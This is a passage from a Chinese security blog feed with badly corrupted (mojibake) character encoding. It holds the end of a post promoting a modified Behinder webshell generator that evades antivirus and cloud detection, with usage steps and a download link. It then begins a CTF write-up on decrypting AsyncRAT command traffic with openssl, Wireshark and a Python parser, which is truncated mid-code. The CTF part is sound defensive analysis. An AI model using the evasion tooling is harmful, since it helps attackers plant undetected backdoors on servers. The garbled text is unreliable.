src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129161620576.png" alt="image-20260129161620576"></p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹ã€‚æ²¡æœ‰é—®é¢˜ã€‚<br>èŠ±ç‚¹æ—¶é—´å°è£…ä¸€ä¸‹ã€‚æ¥ä¸‹æ¥çœ‹ä¸‹å…æ€ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129161829538.png" alt="image-20260129161829538"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129162019412.png" alt="image-20260129162019412"></p><p>é˜¿é‡Œäº‘ä¹Ÿè¿‡äº†ã€‚è¿˜æ˜¯é‚£å°±è¯ï¼Œé˜¿é‡Œäº‘ä¸æ£€æµ‹.netçš„ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129162451988.png" alt="image-20260129162451988"></p><p>ç®€å•çœ‹ä¸‹æµé‡ä¹Ÿæ²¡å•¥é—®é¢˜ã€‚</p><h5 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>é‚£ä¹ˆæ€ä¹ˆä½¿ç”¨å‘¢ï¼Œå¾ˆç®€å•ï¼Œè¿™é‡Œå·²ç»å†™å¥½äº†ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129162620854.png" alt="image-20260129162620854"></p><p>å†°è3å’Œå†°è4ï¼Œç‚¹å‡»è¿™ä¸ªå…æ€ç”Ÿæˆ4ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129162718942.png" alt="image-20260129162718942"></p><p>è¾“å…¥ä¸€ä¸‹åè®®åç§°ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129162836838-17696753171144.png" alt="image-20260129162836838"></p><p>ä¼šç”Ÿæˆå¤šä¸ªæ–‡ä»¶ï¼Œconfigæ˜¯åè®®åç§°ï¼Œå…¶ä»–éƒ½æ˜¯æœ¨é©¬<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129163033685.png" alt="image-20260129163033685"></p><p>ç‚¹å‡»ä¼ è¾“åè®®ï¼Œå¯¼å…¥åˆšåˆšçš„configï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2-bingxie4%E5%85%8D%E6%9D%80/image-20260129163152509-17696755127795.png" alt="image-20260129163152509"></p><p>æ–°å¢urlçš„æ—¶å€™ï¼Œç‚¹å‡»è‡ªå®šä¹‰ï¼Œå°±ä¼šæœ‰æ˜¾ç¤ºä¼ è¾“åè®®ï¼Œé€‰ä¸­åˆšåˆšçš„ä¼ è¾“åè®®å°±å¯ä»¥äº†ã€‚<br>æ˜¯ä¸æ˜¯å¾ˆç®€å•ã€‚è¿™ä¸ªå…¶å®ä¸ç”¨æ¯æ¬¡éƒ½ç”Ÿæˆï¼Œå› ä¸ºå¯¼å…¥çš„éƒ½æ˜¯å®šæ­»çš„ï¼Œåªæ˜¯æ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬æ˜¯ä¸åŒçš„ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>åœ¨ç•Œé¢æ·»åŠ äº†å†°èå…æ€4ç”Ÿæˆçš„æŒ‰é’®ï¼Œè¿™æ ·åœ¨æ‰¾é©¬çš„æ—¶å€™å°±ä¸ä¼šæ‰‹å¿™è„šä¹±çš„äº†ï¼Œç›´æ¥ç”Ÿæˆå³å¯ã€‚è¿™é‡Œä¹Ÿç®—è¿›è¡Œäº†ç®€å•çš„å…æ€ï¼Œå…¨éƒ¨è¯­è¨€é™¤äº† aliyunæ²¡æœ‰è¿‡å»ï¼Œå…¶ä»–çš„å¹³å°åŸºæœ¬å…¨è¿‡ï¼Œaspxçš„é˜¿é‡Œäº‘è¿‡å»äº†ã€‚ä¸å¾—ä¸æ‰¿è®¤ï¼Œaliyunæ˜¯å¼ºçš„ã€‚åˆ°è¿™é‡Œä½ ä¼šå‘ç°ï¼Œè¿™ä¸ªé©¬æ˜¯æ²¡æœ‰å¯†ç çš„ï¼Œæ˜¯çš„ï¼Œæˆ‘ä»¬ç”¨åè®®ä»£æ›¿äº†å¯†ç ï¼Œè‡ªå·±å®šä¹‰åè®®å³å¯ã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>ç›®å‰å°±åªæ˜¯æ›´æ–°äº†è¿™ä¸ªå¯ä»¥å®ç°asciiçš„ç‰ˆæœ¬å§ï¼Œåé¢çœ‹çœ‹æœ‰æ²¡æœ‰æ›´å¥½çš„æµé‡æ–¹å¼ï¼Œå¤ªå¤æ‚äº†æœ‰ç‚¹æ˜æ˜¾ï¼Œæ„Ÿè§‰æœ€å¥½è¿˜æ˜¯ä¼ªè£…æˆæ­£å¸¸çš„æµé‡ï¼Œå¥½çœ‹ä¸€ç‚¹å§ã€‚å½“ç„¶ï¼Œå¦‚æœä½ æœ‰ä»€ä¹ˆå¥½çš„å»ºè®®æˆ–è€…æ€è·¯ï¼Œç•™è¨€å³å¯ã€‚</p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/behinder_erkai">https://github.com/Bohemiana/behinder_erkai</a><br>å¦‚æœæ„Ÿè§‰è¿˜å‡‘åˆï¼Œå¤§å®¶å¸®å¿™ç‚¹ç‚¹star</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚å¦‚æœæ‚¨æ„Ÿè§‰æ–‡ç« å†™çš„ä¸é”™æˆ–è€…å·¥å…·ç”¨èµ·æ¥è¿˜è¡Œï¼Œå¸®ç¬”è€…ç‚¹ç‚¹starsã€ç»™å…¬ä¼—å·ç‚¹ç‚¹å…³æ³¨ï¼Œå…ˆè°¢è°¢å¤§å®¶äº†ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            åŸç‰ˆbehinder</span><br><span class="line">https://mp.weixin.qq.com/s/EwY8if6ed_hZ3nQBiC3o7A                   å†°èv4.0ä¼ è¾“åè®®è¯¦è§£</span><br><span class="line">https://xz.aliyun.com/news/11899        å†°è4.0æµé‡åˆ†æåŠé­”æ”¹</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025æŸé›†å›¢ctfå†³èµ›-RATTRACER-AsyncRATé€šä¿¡è§£å¯†</title>
      <link href="/2025/12/08/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/"/>
      <url>/2025/12/08/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>å°ä¼™ä¼´ç»™äº†ä¸¤é“ctfè¯´å¸®å¿™çœ‹çœ‹ï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹ã€‚<br>é™„ä»¶ï¼Œ<code>https://bohemian.top/images/RATTRACER.zip</code>,æœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥å…ˆè¯•ä¸€ä¸‹ã€‚</p><p>å¼€å±€ç»™åˆ°ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208103438012.png" alt="image-20251208103438012"></p><p>è¿™é‡Œä¸€çœ‹å°±æ˜¯ è¯ä¹¦  éœ€è¦è§£å¯† <img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208103519155.png" alt="image-20251208103519155"></p><p>æ‰“å¼€wireshark å¯ä»¥çœ‹åˆ°æ˜¯ tlsv1çš„æµé‡  è¿™é‡Œéœ€è¦è§£å¯†ã€‚<br>å›å¤´çœ‹p12æ–‡ä»¶<br>p12 æ–‡ä»¶å…¶å®å°±æ˜¯ <strong>PKCS#12 æ ¼å¼çš„è¯ä¹¦æ–‡ä»¶</strong>ï¼Œé€šå¸¸ä»¥ <code>.p12</code> æˆ– <code>.pfx</code> ç»“å°¾ï¼Œç”¨æ¥ **åŒæ—¶å­˜å‚¨è¯ä¹¦ (Certificate) + ç§é’¥ (Private Key)**ï¼Œè€Œä¸”å¯ä»¥è®¾ç½®å¯†ç ä¿æŠ¤ã€‚</p><p>è¿™é‡ŒçŸ¥é“p12æœ‰ç§é’¥ï¼Œä¼šæœ‰å¯†ç ä¿æŠ¤<br><code>openssl pkcs12 -info -in ST.p12</code>æ•²è¿™ä¸ªä¼šè®©æˆ‘ä»¬è¾“å…¥å¯†ç ï¼Œç›´æ¥å›è½¦ï¼Œæ˜¾ç¤º<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208105003334.png" alt="image-20251208105003334"></p><p>è¯´æ˜æ²¡æœ‰å¯†ç ï¼Œ<code>openssl pkcs12 -legacy -in ST.p12 -nocerts -nodes -out key.pem</code>ç›´æ¥å‘½ä»¤æç§é’¥å³å¯ã€‚è®©æˆ‘ä»¬è¾“å¯†ç ï¼Œç›´æ¥å›è½¦å³å¯ã€‚<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208105124027-17651622843281.png" alt="image-20251208105124027"></p><p>æ­¤æ—¶å¯¼å…¥ç§é’¥ã€‚wireshrak -&gt;ç¼–è§£-&gt;é¦–é€‰é¡¹â€“&gt;protocols-&gt;tls<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208105506465.png" alt="image-20251208105506465"></p><p>ip port åè®®  å’Œç§é’¥å¡«å†™å¥½ã€‚</p><p><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208105623802.png" alt="image-20251208105623802"></p><p>æ­¤æ—¶ä½ éšä¾¿é€‰ä¸­ä¸€ä¸ªtlsæµé‡å°±å¯ä»¥çœ‹åˆ°è§£å¯†åçš„æµé‡äº†ï¼Œ<img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208105709957.png" alt="image-20251208105709957"></p><p>æ­¤æ—¶çœ‹åˆ°é‡Œé¢è¿˜æ˜¯ åŠ å¯†çš„ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°ä¸€ç‚¹ç‚¹ç‰¹å¾ã€‚è¿™ä¸ªratçš„ç‰¹å¾å‘¢ã€‚</p><p><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208110103208.png" alt="image-20251208110103208"></p><p>ç»è¿‡å¯¹è¿™ä¸ªç‰¹å¾çš„æœç´¢ï¼Œæ‰¾åˆ°ä¸€ç¯‡å¤§å¸ˆå‚…çš„æ–‡ç« ï¼Œå‘ç°ä¸ºAsyncRATï¼Œ<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208110532777.png" alt="image-20251208110532777"></p><p>å¼€æºé¡¹ç›®<code>https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp</code></p><p><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208160020975.png" alt="image-20251208160020975"></p><p>åœ¨<code>https://mp.weixin.qq.com/s/AJUQ8Zd_4Q3Ub9TarQx5Gg</code>æ–‡ç« ä¸­ å·²ç»ç»™å‡ºäº†è¯¦ç»†çš„è§£å¯†æµç¨‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¤–å±‚æ˜¯å¥—äº†tlsçš„æ•°æ®ï¼Œæœ‰ç§é’¥å°±èƒ½è§£ï¼Œå†…å±‚ä¹Ÿå°±æ˜¯ç°åœ¨çœ‹åˆ°çš„ï¼Œä¸æ¶‰åŠåŠ è§£å¯†ï¼Œåªæ¶‰åŠ<strong>gunzip</strong>å’Œ<strong>unzip</strong>ï¼Œå†å°±æ˜¯æ–‡ä»¶ç»“æ„äº†ã€‚åœ¨ä»”ç»†çœ‹å¤§å¸ˆå‚…æ–‡ç« ä¸­è¯´çš„ä½¿ç”¨åˆ°çš„aes keyåŠHMACSHA256 keyï¼Œaes keyåŠHMACSHA256 keyæ˜¯å¯¹é…ç½®ä¿¡æ¯è¿›è¡Œè§£å¯†ï¼Œä¹Ÿå°±æ˜¯è§£å¯†æ ·æœ¬çš„ï¼Œåœ¨æ­¤é¢˜ä¸­ä¸æ¶‰åŠï¼Œå°±ä¸è®²äº†ã€‚æ¥ä¸‹æ¥çœ‹é€šä¿¡ã€‚<br><img src="/images/2025%E6%9F%90%E9%9B%86%E5%9B%A2ctf%E5%86%B3%E8%B5%9B-RATTRACER-AsyncRAT%E9%80%9A%E4%BF%A1%E8%A7%A3%E5%AF%86/image-20251208114323745.png" alt="image-20251208114323745"></p><p>è¿™é‡Œé€‰æ‹©ä¸€ä¸ªæ•°æ®åŒ…ï¼Œå…¶ä¸­ä»<em>1f 8b 08</em>å¼€å§‹ï¼Œè¿™æ˜¯gzipçš„hexå¤´ï¼Œç„¶ågunzipå³å¯ï¼Œè§£å‡ºæ‰€æœ‰æµé‡äº†ï¼Œè¿™é‡Œç»™å‡ºpythonæ‰¹é‡è„šæœ¬ã€‚è¿™é‡Œéœ€è¦å…ˆå°†æ‰€æœ‰çš„æµéƒ½ä¿å­˜ä¸ºbinæ–‡ä»¶ï¼Œå…¶å®ä»€ä¹ˆæ–‡ä»¶éƒ½è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> reverse_data, bytes_to_int, gzip_uncompress, hash_data_sha256, write_file</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbuflen</span>(<span class="params">buf, isreverse=<span class="literal">False</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è·å–ç¼“å†²åŒºé•¿åº¦&quot;&quot;&quot;</span></span><br><span class="line">    tmp = buf[:]</span><br><span class="line">    <span class="keyword">if</span> isreverse:</span><br><span class="line">        tmp = reverse_data(tmp)</span><br><span class="line">    <span class="keyword">return</span> bytes_to_int(tmp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseMsgPack</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è§£æMsgPackæ•°æ®&quot;&quot;&quot;</span></span><br><span class="line">    output = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é”®å€¼å¯¹æ•°é‡</span></span><br><span class="line">    output.append(<span class="built_in">str</span>(data[<span class="number">0</span>] - <span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">    off = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> off &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="comment"># è§£æè½½è·æ•°æ®</span></span><br><span class="line">        buf, num = readstring(data[off:])</span><br><span class="line">        <span class="keyword">if</span> num != <span class="number">0</span>:</span><br><span class="line">            output.append(buf)</span><br><span class="line">            off += num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> buf == <span class="string">&quot;Msgpack&quot;</span>:</span><br><span class="line">            msgbuf, num = readbinary(data[off:])</span><br><span class="line">            <span class="keyword">if</span> num != <span class="number">0</span>:</span><br><span class="line">                output.append(msgbuf)</span><br><span class="line">                off += num</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(output) &gt;= <span class="number">2</span> <span class="keyword">and</span> output[-<span class="number">1</span>] == <span class="string">&quot;Dll&quot;</span> <span class="keyword">and</span> output[-<span class="number">2</span>] == <span class="string">&quot;savePlugin&quot;</span>:</span><br><span class="line">            msgbuf, num = readbinary(data[off:])</span><br><span class="line">            <span class="keyword">if</span> num != <span class="number">0</span>:</span><br><span class="line">                output.append(msgbuf)</span><br><span class="line">                off += num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;-&gt;&quot;</span>.join(output), off</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readstring</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¯»å–å­—ç¬¦ä¸²&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    byteflag = data[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">160</span> &lt;= byteflag &lt;= <span class="number">191</span>:</span><br><span class="line">        num = byteflag - <span class="number">160</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; num + <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        output = data[<span class="number">1</span>:num+<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output, num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> byteflag == <span class="number">217</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        num = data[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; num + <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        output = data[<span class="number">2</span>:num+<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output, num + <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readbinary</span>(<span class="params">buf</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¯»å–äºŒè¿›åˆ¶æ•°æ®&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> buf:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    byteflag = buf[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> byteflag == <span class="number">0xc4</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        len_zipdata = buf[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">6</span> + len_zipdata - <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        len_data = getbuflen(buf[<span class="number">2</span>:<span class="number">6</span>], <span class="literal">True</span>)</span><br><span class="line">        zipdata = buf[<span class="number">6</span>:<span class="number">6</span>+len_zipdata-<span class="number">4</span>]</span><br><span class="line">        data = gzip_uncompress(zipdata)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> len_data != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        output, off = parseMsgPack(data)</span><br><span class="line">        <span class="keyword">if</span> off != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> output, <span class="number">2</span> + len_zipdata</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> byteflag == <span class="number">0xc6</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        len_zipdata = getbuflen(buf[<span class="number">1</span>:<span class="number">5</span>], <span class="literal">False</span>)</span><br><span class="line">        len_data = getbuflen(buf[<span class="number">5</span>:<span class="number">9</span>], <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">9</span> + len_zipdata - <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="number">0</span></span><br><span class="line">        zipdata = buf[<span class="number">9</span>:<span class="number">9</span>+len_zipdata-<span class="number">4</span>]</span><br><span class="line">        data = gzip_uncompress(zipdata)</span><br><span 